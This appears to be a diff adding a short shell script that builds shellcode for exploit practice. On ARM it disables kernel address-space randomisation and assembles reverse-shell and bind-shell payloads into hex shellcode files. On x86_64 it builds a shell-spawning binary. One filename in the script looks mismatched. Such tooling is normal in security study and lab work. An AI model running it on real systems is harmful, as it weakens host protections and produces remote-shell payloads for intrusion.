@@ -1,0 +1,20 @@
+#!/bin/sh
+
+if [ $(uname -m) = arm ];
+then 
+	echo 0 > /proc/sys/kernel/randomize_va_space
+	as arm_rev_sh.s -o arm_rev_sh.o
+	ld -N arm_rev_sh.o -o arm_rev_sh
+	objcopy -O binary arm_rev_sh arm_rev_sh.bin
+	hexdump -v -e '"\\""x" 1/1 "%02x" ""' arm_rev_sh.bin > rev.shellcode
+	as arm_bind_shell.s -o arm_bind_shell.o
+	ld -N arm_bind_shell.o -o arm_bind_shell
+	objcopy -O binary arm_bind_shell arm_bind_shell.bin
+	hexdump -v -e '"\\""x" 1/1 "%02x" ""' bind_shell.bin > bind.shellcode
+elif [ $(uname -m) = x86_64 ];
+then
+nasm -f elf32 spawn_shell.asm -o spawn_shell.o
+ld -m elf_i386 spawn_shell.o -o spawn_shell
+else
+	echo "1"
+fi
